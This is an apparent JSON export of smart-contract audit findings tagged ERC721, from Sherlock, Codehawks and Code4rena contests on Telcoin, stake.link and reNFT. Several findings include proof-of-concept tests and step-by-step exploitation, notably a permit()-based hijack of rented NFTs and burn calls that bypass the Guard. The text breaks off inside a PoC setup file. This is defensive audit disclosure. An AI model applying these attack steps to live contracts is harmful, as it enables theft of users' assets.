{
  "tag": "ERC721",
  "count": 21,
  "metadata": {
    "totalResults": 21,
    "totalPages": 1
  },
  "last_rateLimit": {
    "limit": 20,
    "remaining": 0,
    "reset": 1771761060
  },
  "findings": [
    {
      "id": "30181",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 43,
      "protocol_id": "1244",
      "title": "H-3: CouncilMember:burn renders the contract inoperable after the first execution",
      "content": "Source: https://github.com/sherlock-audit/2024-01-telcoin-judging/issues/199 \n\n## Found by \n0xAsen, 0xLogos, 0xadrii, 0xlamide, 0xmystery, 0xpep7, Aamirusmani1552, Arz, BAICE, Bauer, DenTonylifer, HonorLt, Ignite, IvanFitro, Jaraxxus, Kow, Krace, VAD37, alexbabits, almurhasan, araj, bitsurfer, dipp, fibonacci, ggg\\_ttt\\_hhh, gqrp, grearlake, jah, m4ttm, mstpr-brainbot, popeye, psb01, r0ck3tz, ravikiran.web3, sakshamguruji, sobieski, sonny2k, tives, ubl4nk, vvv, ydlee, zhuying, zzykxx\n## Summary\nThe CouncilMember contract suffers from a critical vulnerability that misaligns the balances array after a successful burn, rendering the contract inoperable.\n\n## Vulnerability Detail\n\nThe root cause of the vulnerability is that the `burn` function incorrectly manages the `balances` array, shortening it by one each time an ERC721 token is burned while the latest minted NFT still withholds its unique `tokenId` which maps to the previous value of `balances.length`.\n```solidity\n// File: telcoin-audit/contracts/sablier/core/CouncilMember.sol\n210:    function burn(\n        ...\n220:        balances.pop(); // <= FOUND: balances.length decreases, while latest minted nft withold its unique tokenId\n221:        _burn(tokenId);\n222:    }\n```\n\nThis misalignment between existing `tokenIds` and the `balances` array results in several critical impacts:\n\n1. Holders with tokenId greater than the length of balances cannot claim.\n2. Subsequent burns of tokenId greater than balances length will revert.\n3. Subsequent mint operations will revert due to tokenId collision. As `totalSupply` now collides with the existing `tokenId`.\n```solidity\n// File: telcoin-audit/contracts/sablier/core/CouncilMember.sol\n173:    function mint(\n        ...\n179:\n180:        balances.push(0);\n181:        _mint(newMember, totalSupply());// <= FOUND\n182:    }\n```\n\nThis mismanagement creates a cascading effect, collectively rendering the contract inoperable. Following POC will demonstrate the issue more clearly in codes.\n\n### POC\n\nRun `git apply` on the following patch then run `npx hardhat test` to run the POC.\n```patch\ndiff --git a/telcoin-audit/test/sablier/CouncilMember.test.ts b/telcoin-audit/test/sablier/CouncilMember.test.ts\nindex 675b89d..ab96b08 100644\n--- a/telcoin-audit/test/sablier/CouncilMember.test.ts\n+++ b/telcoin-audit/test/sablier/CouncilMember.test.ts\n@@ -1,13 +1,14 @@\n import { expect } from \"chai\";\n import { ethers } from \"hardhat\";\n import { SignerWithAddress } from \"@nomicfoundation/hardhat-ethers/signers\";\n-import { CouncilMember, TestTelcoin, TestStream } from \"../../typechain-types\";\n+import { CouncilMember, TestTelcoin, TestStream, ERC721Upgradeable__factory } from \"../../typechain-types\";\n \n describe(\"CouncilMember\", () => {\n     let admin: SignerWithAddress;\n     let support: SignerWithAddress;\n     let member: SignerWithAddress;\n     let holder: SignerWithAddress;\n+    let lastCouncilMember: SignerWithAddress;\n     let councilMember: CouncilMember;\n     let telcoin: TestTelcoin;\n     let stream: TestStream;\n@@ -18,7 +19,7 @@ describe(\"CouncilMember\", () => {\n     let supportRole: string = ethers.keccak256(ethers.toUtf8Bytes(\"SUPPORT_ROLE\"));\n \n     beforeEach(async () => {\n-        [admin, support, member, holder, target] = await ethers.getSigners();\n+        [admin, support, member, holder, target, lastCouncilMember] = await ethers.getSigners();\n \n         const TestTelcoinFactory = await ethers.getContractFactory(\"TestTelcoin\", admin);\n         telcoin = await TestTelcoinFactory.deploy(admin.address);\n@@ -182,6 +183,22 @@ describe(\"CouncilMember\", () => {\n                 it(\"the correct removal is made\", async () => {\n                     await expect(councilMember.burn(1, support.address)).emit(councilMember, \"Transfer\");\n                 });\n+                it.only(\"inoperable contract after burn\", async () => {\n+                    await expect(councilMember.mint(lastCouncilMember.address)).to.not.reverted;\n+\n+                    // This 1st burn will cause contract inoperable due to tokenId & balances misalignment\n+                    await expect(councilMember.burn(1, support.address)).emit(councilMember, \"Transfer\");\n+\n+                    // Impact 1. holder with tokenId > balances length cannot claim\n+                    await expect(councilMember.connect(lastCouncilMember).claim(3, 1)).to.revertedWithPanic(\"0x32\"); // @audit-info 0x32: Array accessed at an out-of-bounds or negative index\n+\n+                    // Impact 2. subsequent burns of tokenId > balances length will revert\n+                    await expect(councilMember.burn(3, lastCouncilMember.address)).to.revertedWithPanic(\"0x32\"); \n+\n+                    // Impact 3. subsequent mint will revert due to tokenId collision\n+                    await expect(councilMember.mint(lastCouncilMember.address)).to.revertedWithCustomError(councilMember, \"ERC721InvalidSender\");\n+\n+                });\n             });\n         });\n \n\n```\n\n### Result \n>   CouncilMember\n>     mutative\n>       burn\n>         Success\n>           âœ” inoperable contract after burn (90ms)\n>   1 passing (888ms)\n\nThe Passing execution of the POC confirmed that operations such as `claim`, `burn` & `mint` were all reverted which make the contract inoperable.\n\n## Impact\nThe severity of the vulnerability is high due to the high likelihood of occurence and the critical impacts on the contract's operability and token holders' ability to interact with their assets. \n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-01-telcoin/blob/main/telcoin-audit/contracts/sablier/core/CouncilMember.sol#L220\n\n## Tool used\nVsCode\n\n## Recommendation\nIt is recommended to avoid popping out balances to keep alignment with uniquely minted tokenId. Alternatively, consider migrating to ERC1155, which inherently manages a built-in balance for each NFT.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  valid because { this is a valid findings because the watson explain how again the burn function will break a functionality just like the previous issue thus making it a dupp of 109}\n\n\n\n**nevillehuang**\n\nSee comments [here](https://github.com/sherlock-audit/2024-01-telcoin-judging/issues/32) for duplication reasons.\n\n**amshirif**\n\nhttps://github.com/telcoin/telcoin-audit/pull/31",
      "summary": "\nThis bug report discusses a critical vulnerability found in the CouncilMember contract, which is used for managing ERC721 tokens. The issue is caused by the `burn` function incorrectly managing the `balances` array, which results in several critical impacts, including making the contract inoperable and preventing token holders from interacting with their assets. The vulnerability was found by a group of researchers and confirmed through a proof of concept. The severity of the vulnerability is high and it is recommended to avoid popping out balances or consider migrating to ERC1155. ",
      "report_date": {},
      "contest_prize_txt": "13000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/156",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-01-telcoin-judging/issues/199",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "156",
      "slug": "h-3-councilmemberburn-renders-the-contract-inoperable-after-the-first-execution-sherlock-telcoin-platform-audit-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Telcoin Platform Audit",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Telcoin Platform Audit",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        }
      ]
    },
    {
      "id": "29747",
      "kind": "GIT",
      "auditfirm_id": "20",
      "impact": "LOW",
      "finders_count": 3,
      "protocol_id": "1230",
      "title": "No Check for Transferring to Self",
      "content": "### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-12-stake-link/tree/main/contracts/core/sdlPool/base/SDLPool.sol#L460-462\">https://github.com/Cyfrin/2023-12-stake-link/tree/main/contracts/core/sdlPool/base/SDLPool.sol#L460-462</a>\n\n\n## Summary\n\nThe `_transfer` function is responsible for transferring the ownership of a lock from one address to another. It is a critical part of the ERC721 token standard implementation, which this contract adheres to. However, there is a missing check to ensure that the `_from` address is not the same as the `_to` address. Transferring a lock where the `_from` and `_to` addresses are the same can lead to unintended consequences like the double changing of state variables.\n\nSince the _updateRewards function logic depends on the rewards pool, this could create an exploit depending on the implementation of the rewards pool. \n\nBy adding this check, we can ensure that locks are not transferred to the same address that already owns them, thus mitigating the described vulnerability.\n\n## Recommendations\n\nAdd a check to the _transfer function to ensure that `_from` != `_to`.",
      "summary": "",
      "report_date": {},
      "contest_prize_txt": "27500 USDC",
      "contest_link": "https://www.codehawks.com/contests/clqf7mgla0001yeyfah59c674",
      "sponsor_name": "stake.link",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "",
      "github_link": "https://github.com/Cyfrin/2023-12-stake-link",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "clqf7mgla0001yeyfah59c674",
      "slug": "no-check-for-transferring-to-self-codehawks-stakelink-git",
      "firm_name": "Codehawks",
      "firm_logo_square": "codehawks_square.png",
      "protocol_name": "stake.link",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Codehawks",
        "logo_square": "codehawks_square.png"
      },
      "protocols_protocol": {
        "name": "stake.link",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        }
      ]
    },
    {
      "id": "30539",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 2,
      "protocol_id": "1238",
      "title": "[M-12] paused ERC721/ERC1155 could cause stopRent to revert, potentially causing issues for the lender.",
      "content": "\nMany ERC721/ERC1155 tokens, including well-known games such as Axie Infinity, have a pause functionality inside the contract. This pause functionality will cause the `stopRent` call to always revert and could cause issues, especially for the `PAY` order type.\n\n### Proof of Concept\n\nWhen `stopRent` /`stopRentBatch` is called, it will eventually trigger `  _reclaimRentedItems ` and execute `reclaimRentalOrder` from the safe to send back tokens to lender.\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L353> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L293> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L166-L183>\n\n\n\n```solidity\n    function _reclaimRentedItems(RentalOrder memory order) internal {\n        // Transfer ERC721s from the renter back to lender.\n        bool success = ISafe(order.rentalWallet).execTransactionFromModule(\n            // Stop policy inherits the reclaimer package.\n            address(this),\n            // value.\n            0,\n            // The encoded call to the `reclaimRentalOrder` function.\n            abi.encodeWithSelector(this.reclaimRentalOrder.selector, order),\n            // Safe must delegate call to the stop policy so that it is the msg.sender.\n            Enum.Operation.DelegateCall\n        );\n\n        // Assert that the transfer back to the lender was successful.\n        if (!success) {\n            revert Errors.StopPolicy_ReclaimFailed();\n        }\n    }\n```\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L71-L101> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L32-L34> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L42-L50>\n\n```solidity\n    function reclaimRentalOrder(RentalOrder calldata rentalOrder) external {\n        // This contract address must be in the context of another address.\n        if (address(this) == original) {\n            revert Errors.ReclaimerPackage_OnlyDelegateCallAllowed();\n        }\n\n        // Only the rental wallet specified in the order can be the address that\n        // initates the reclaim. In the context of a delegate call, address(this)\n        // will be the safe.\n        if (address(this) != rentalOrder.rentalWallet) {\n            revert Errors.ReclaimerPackage_OnlyRentalSafeAllowed(\n                rentalOrder.rentalWallet\n            );\n        }\n\n        // Get a count for the number of items.\n        uint256 itemCount = rentalOrder.items.length;\n\n        // Transfer each item if it is a rented asset.\n        for (uint256 i = 0; i < itemCount; ++i) {\n            Item memory item = rentalOrder.items[i];\n\n            // Check if the item is an ERC721.\n            if (item.itemType == ItemType.ERC721)\n>>>             _transferERC721(item, rentalOrder.lender);\n\n            // check if the item is an ERC1155.\n            if (item.itemType == ItemType.ERC1155)\n>>>             _transferERC1155(item, rentalOrder.lender);\n        }\n    }\n```\n\nIt can be observed that AxieInfinity has paused functionality : <https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d>\n\nThis is problematic, especially for the `PAY` order type. Consider a scenario where the lender is not satisfied with how the renter utilizes their `PAY` order's NFTs. Now, when the lender wants to early stop the rent and calls `stopRent`, the call will revert, and the earning calculation for the renter will still be growing.\n\n### Recommended Mitigation Steps\n\nConsider decoupling the NFT claim from stopRent and introducing a timestamp tracker when the lender calls stopRent. Utilize that timestamp value when the rent stop is finalized and calculate the ERC20 reward for the renter.\n\n**[Alec1017 (reNFT) acknowledged and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/220#issuecomment-1908721888):**\n > Non-standard ERC implementations were considered out of scope, but regardless we do plan on adding a whitelist for tokens interacting with the protocol\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/220#issuecomment-1921360740):**\n > In theory the protocol could mitigate this with a pull mechanism which could be executed after the unpause and allow the counterparty to be unaffected.  Currently this amounts to a temporary DOS and therefore seems like M is correct.  I think its an edge case, but its plausible as the warden has shown. \n\n _Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/220)._\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/7) - Implements a whitelist so only granted assets can be used in the protocol.<br>\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/17) - Implements batching functionality for whitelisting tokens so that multiple can be added at once.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/64) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/59).\n\n***\n\n",
      "summary": "\nERC721/ERC1155 tokens, such as those used in popular games like Axie Infinity, have a feature called \"pause\" in their contracts. This pause feature can cause problems when using the `stopRent` function, especially for the `PAY` order type. A demonstration of this issue can be found in the code provided in the report. The team behind the protocol has acknowledged the issue and has taken steps to mitigate it by implementing a whitelist for tokens that can be used in the protocol. This has been confirmed as a successful mitigation by independent reviewers.",
      "report_date": {},
      "contest_prize_txt": "83600",
      "contest_link": "https://code4rena.com/reports/2024-01-renft",
      "sponsor_name": "reNFT",
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 3,
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/220",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "317",
      "slug": "m-12-paused-erc721erc1155-could-cause-stoprent-to-revert-potentially-causing-issues-for-the-lender-code4rena-renft-renft-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "reNFT",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "reNFT",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 1391.208791137663
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "Grief Attack"
          }
        },
        {
          "tags_tag": {
            "title": "NFT"
          }
        }
      ]
    },
    {
      "id": "30535",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 23,
      "protocol_id": "1238",
      "title": "[M-08] Assets in a Safe can be lost",
      "content": "\nThe `Guard.sol` contract is enabled on Safe's and uses the [`_checkTransaction`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195-L293) function to ensure that transactions that the Safe executes do not transfer the asset out of the Safe.\n\nThe `checkTransaction` function achieves this by isolating the function selector and checking that it is not a disallowed function selector. For instance: `safeTransferFrom`, `transferFrom`, `approve`, `enableModule`, etc.\n\nThe list does not, however, check for calls to `burn` the token, neither does it check if it is a `permit`. The sponsor has noted the following:\n\n> The [Guard](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol) contract can only protect against the transfer of tokens that faithfully\nimplement the ERC721/ERC1155 spec.\n\nBut this does not acknowledge the fact that an ERC721/ERC1155 implementation can still be an honest implementation and have extra functionality. In particular, the `burn` function is a common addition to many ERC721 contracts, usually granted through inheriting `ERC721Burnable`.\n\nFor example, the following projects all have a `burn` function, and Safe's protected by `Guard.sol` that hold these NFTs will be vulnerable to loss of assets via a malicious renter:\n\n*   [Pudgy Penguins](https://etherscan.io/address/0xbd3531da5cf5857e7cfaa92426877b022e612cf8#writeContract)\n*   [Lil Pudgies](https://etherscan.io/address/0x524cab2ec69124574082676e6f654a18df49a048#writeContract)\n*   [Oh Ottie](https://etherscan.io/address/0x7ff5601b0a434b52345c57a01a28d63f3e892ac0#code#F3#L45)\n\nThese are three that are in the top 10 projects on Opensea at the time of writing.\n\n### Proof of Concept\n\nWe can see in the `Guard.sol` file that certain function selectors are imported to be tested against:\n\n    import {\n        shared_set_approval_for_all_selector,\n        e721_approve_selector,\n        e721_safe_transfer_from_1_selector,\n        e721_safe_transfer_from_2_selector,\n        e721_transfer_from_selector,\n        e721_approve_token_id_offset,\n        e721_safe_transfer_from_1_token_id_offset,\n        e721_safe_transfer_from_2_token_id_offset,\n        e721_transfer_from_token_id_offset,\n        e1155_safe_transfer_from_selector,\n        e1155_safe_batch_transfer_from_selector,\n        e1155_safe_transfer_from_token_id_offset,\n        e1155_safe_batch_transfer_from_token_id_offset,\n        gnosis_safe_set_guard_selector,\n        gnosis_safe_enable_module_selector,\n        gnosis_safe_disable_module_selector,\n        gnosis_safe_enable_module_offset,\n        gnosis_safe_disable_module_offset\n    } from \"@src/libraries/RentalConstants.sol\";\n\nFrom the `_checkTransaction` function we see that there is no check for `burn`, `burnFrom` or `permit`.\n\nA malicious renter who is renting the asset can still execute `burn` (common), `burnFrom` (rare) or `permit` (popularized by [Uni v3](https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/base/ERC721Permit.sol#L52C9-L86)), which will lead to loss of the asset.\n\n### Coded PoC\n\nThe below test can be placed in the `CheckTransaction.t.sol` test file. It should be run with `forge test --match-test test_PoC -vvvv`\n\n        function test_PoC() public {\n            bytes4 burn_selector = 0x42966c68;\n            // Create a rentalId array\n            RentalAssetUpdate[] memory rentalAssets = new RentalAssetUpdate[](1);\n            rentalAssets[0] = RentalAssetUpdate(\n                RentalUtils.getItemPointer(address(alice.safe), address(erc721s[0]), 0),\n                1\n            );\n\n            // Mark the rental as actively rented in storage\n            _markRentalsAsActive(rentalAssets);\n\n            // Build up the `transferFrom(address from, address to, uint256 tokenId)` calldata\n            bytes memory burnCalldata = abi.encodeWithSelector(\n                burn_selector,\n                69\n            );\n\n            // Expect revert because of an unauthorized function selector\n            _checkTransactionRevertUnauthorizedSelector(\n                address(alice.safe),\n                address(erc721s[0]),\n                burn_selector,\n                burnCalldata\n            );\n        }\n\nThe console output is:\n\n    Encountered 1 failing test in test/unit/Guard/CheckTransaction.t.sol:Guard_CheckTransaction_Unit_Test\n    [FAIL. Reason: call did not revert as expected] test_PoC() (gas: 96093)\n\nThis shows that the `checkTransaction` would not protect against calls to `burn` the asset.\n\n### Recommended Mitigation Steps\n\nAlthough not a catch-all, adding checks for `burn`, `burnFrom` and `permit` functions (which are common in smart contracts) should prevent this in most cases.\n\nSelectors:\n\n*   `burn`: `0x42966c68`\n*   `burnFrom`: `0x1fe41211`\n*   `permit` : `0xabae8f0d`\n\nIn the `Guard.sol` file:\n\n<Details>\n\n```diff\n        } else if (selector == e1155_safe_transfer_from_selector) {\n            // Load the token ID from calldata.\n            uint256 tokenId = uint256(\n                _loadValueFromCalldata(data, e1155_safe_transfer_from_token_id_offset)\n            );\n\n            // Check if the selector is allowed.\n            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } else if (selector == burn_selector) {\n+           // Load the extension address from calldata.\n+           address extension = address(\n+               uint160(\n+                    uint256(\n+                       _loadValueFromCalldata(data, burn_selector_offset)\n+                   )\n+               )\n+           );\n+\n+            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } else if (selector == burn_From_selector) {\n+           // Load the extension address from calldata.\n+           address extension = address(\n+               uint160(\n+                    uint256(\n+                       _loadValueFromCalldata(data, burn_From_selector_offset)\n+                   )\n+               )\n+           );\n+\n+            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } else if (selector == permit_selector) {\n+           // Load the extension address from calldata.\n+           address extension = address(\n+               uint160(\n+                    uint256(\n+                       _loadValueFromCalldata(data, permit_selector_offset)\n+                   )\n+               )\n+           );\n+\n+            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } \n```\n</details>\n\n*Please note that there may be other flavours of the `permit` function that have different signatures.*\n\n**[141345 (Lookout) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1902725917):**\n > [Issue 587](https://github.com/code-423n4/2024-01-renft-findings/issues/587) has a detailed discussion about `permit()`.\n\n**[Alec1017 (reNFT) acknowledged and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1908940377):**\n > Non-standard ERC implementations were considered out of scope, but regardless we do plan on adding a whitelist for tokens interacting with the protocol\n\n**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1912774849):**\n > Originally commented on https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1912630065\n> \n> But same thing applies here, I don't think this can be called out of scope but do think M is more appropiate.\n\n**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1915456905):**\n > Given the justification for #587, M severity seems fair.\n\n**[lokithe5th (Warden) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1916119263):**\n > @0xean thank you for your judging efforts. \n> \n> As the author of this submission I would like to highlight a mistake in my report: the Safe itself will not be calling the `permit()` function, only signing a transaction that approves a `permit`. Adding a check for the `permit` selector will not be effective. \n> \n> I draw attention to this fact because I do not want the sponsor to believe they have guarded against the `permit` vulnerability by implementing the suggested fix, while they may still in fact be vulnerable to it.\n> \n> However, the PoC and the suggested fix remain valid for `burn` and `burnFrom` functions. \n> \n> Credit to issue #587 and @stalinMacias for pointing this nuance out.\n\n**[0xStalin (Warden) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1916150182):**\n > Thanks @lokithe5th. \n> \n> I believe this issue is completely valid in regards to the `burn` functionality and is providing the right mitigation for it.\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/5) - Added support for burnable ERC721 and ERC1155 tokens.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/53), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/55) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/14).\n\n***\n\n",
      "summary": "\nThe report discusses a vulnerability in the Guard.sol contract used on Safe's. The contract is responsible for ensuring that transactions do not transfer assets out of the Safe. However, the contract does not check for calls to the `burn` function or other functions such as `burnFrom` and `permit`, which can lead to loss of assets. The report provides a proof of concept and recommends adding checks for these functions to prevent the vulnerability. The sponsor has acknowledged the issue and plans to add a whitelist for tokens interacting with the protocol. The severity of the issue has been decreased to medium and the sponsor has implemented a fix.",
      "report_date": {},
      "contest_prize_txt": "83600",
      "contest_link": "https://code4rena.com/reports/2024-01-renft",
      "sponsor_name": "reNFT",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/323",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "317",
      "slug": "m-08-assets-in-a-safe-can-be-lost-code4rena-renft-renft-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "reNFT",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "reNFT",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 1391.208791137663
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "NFT"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "30529",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "1238",
      "title": "[M-02] A malicious borrower can hijack any NFT with `permit()` function he rents.",
      "content": "\n### Pre-requisite knowledge & an overview of the features in question\n\n***\n\n1.  **ERC-4494: Permit for ERC-721 NFTs**: ERC721-Permit is very similar to ERC20-permit (EIP-2612). ERC721 Permit adds a new `permit()` function. It allows user can sign an ERC721 approve transaction off-chain producing a signature that anyone could use and submit to the permit function. When permit is executed, it will execute the approve function. This allows for meta-transaction support of ERC721 transfers, but it also simply gets rid of the annoyance of needing two transactions: `approve` and `transferFrom`. Additionally, ERC721-Permit, just like ERC20 permit, prevents misuse and replay attacks. A replay attack is when a valid signature is used several times or in places where it's not intended to be used in.\n\n    You can find an implementation of it here, by uniswap: <https://github.com/Uniswap/v3-periphery/blob/main/contracts/base/ERC721Permit.sol>\n\n***\n\n### The Vulnerability & Exploitation Steps\n\n***\n\nReNFT doesn't account for ERC721 implementing the `permit()` function, allowing a malicious borrower to hijack the token by producing a signature and feeding it to the `permit()` function requesting it to approve his address to transfer the token\n\n**Exploitation Steps**\n\n1.  The attacker rents the NFT token in his rental safe\n2.  The attacker creates a signature which he will need to feed to the `permit()` function. The signature is a signed data including info like: 1. the deadline (until when the signature would be valid), 2. the token ID he wants to approve his address to spend, 3. the spender, in this case it's the attacker's address (Look at the PoC to see how it's generated)\n3.  The attacker calls `permit()` funtion and gives it the signature along with the deadline, approved address and the spender.\n4.  The `permit()` function will reach out to the attacker's rental safe (since it is the owner of the token and since it's a smart contract verifying the signature (EIP-1271) ), asking it if the signature is valid\n5.  The rental safe will verify the signature and confirm that it's the attacker (owner of the safe) who signed the transaction\n6.  `permit()` will approve the attacker's address to spend the token on behalf of the attacker's safe (token is owned by the safe)\n7.  Attacker will then transfer the token out of his safe.\n\n***\n\n### Proof of concept\n\n***\n\nTo run the PoC, you'll need to do the following:\n\n1.  You'll need to add the following two files to the test/ folder:\n    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts\n    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.\n2.  You'll need to run this command\n    `forge test --match-contract Exploit --match-test test_NFT_Permit_Exploit -vvv`\n\n*Note: All of my 7 PoCs throughout my reports include the `SetupExploit.sol`. Please do not rely on the previous `SetupExploit.sol` file if you already had one from another PoC run in the tests/ folder. In some PoCs, there are slight modifications done in that file to properly set up the test infrastructure needed for the exploit*\n\n**The files:**\n\n<details>\n<summary><b>SetupExploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        ConsiderationItem,\n        OfferItem,\n        OrderParameters,\n        OrderComponents,\n        Order,\n        AdvancedOrder,\n        ItemType,\n        ItemType as SeaportItemType,\n        CriteriaResolver,\n        OrderType as SeaportOrderType,\n        Fulfillment,\n        FulfillmentComponent\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n    import {\n        AdvancedOrderLib,\n        ConsiderationItemLib,\n        FulfillmentComponentLib,\n        FulfillmentLib,\n        OfferItemLib,\n        OrderComponentsLib,\n        OrderLib,\n        OrderParametersLib,\n        SeaportArrays,\n        ZoneParametersLib\n    } from \"@seaport-sol/SeaportSol.sol\";\n\n    import {\n        OrderMetadata,\n        OrderType,\n        OrderFulfillment,\n        RentPayload,\n        RentalOrder,\n        Item,\n        SettleTo,\n        ItemType as RentalItemType\n    } from \"@src/libraries/RentalStructs.sol\";\n\n    import {ECDSA} from \"@openzeppelin-contracts/utils/cryptography/ECDSA.sol\";\n    import {OrderMetadata, OrderType, Hook} from \"@src/libraries/RentalStructs.sol\";\n    import {Vm} from \"@forge-std/Vm.sol\";\n    import {Test} from \"@forge-std/Test.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {LibString} from \"@solady/utils/LibString.sol\";\n    import {SafeL2} from \"@safe-contracts/SafeL2.sol\";\n    import {Safe} from \"@safe-contracts/Safe.sol\";\n    // import {BaseExternal} from \"@test/fixtures/external/BaseExternal.sol\";\n    import {SafeProxyFactory} from \"@safe-contracts/proxies/SafeProxyFactory.sol\";\n    import {Create2Deployer} from \"@src/Create2Deployer.sol\";\n    import {Kernel, Actions} from \"@src/Kernel.sol\";\n    import {Storage} from \"@src/modules/Storage.sol\";\n    import {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n    import 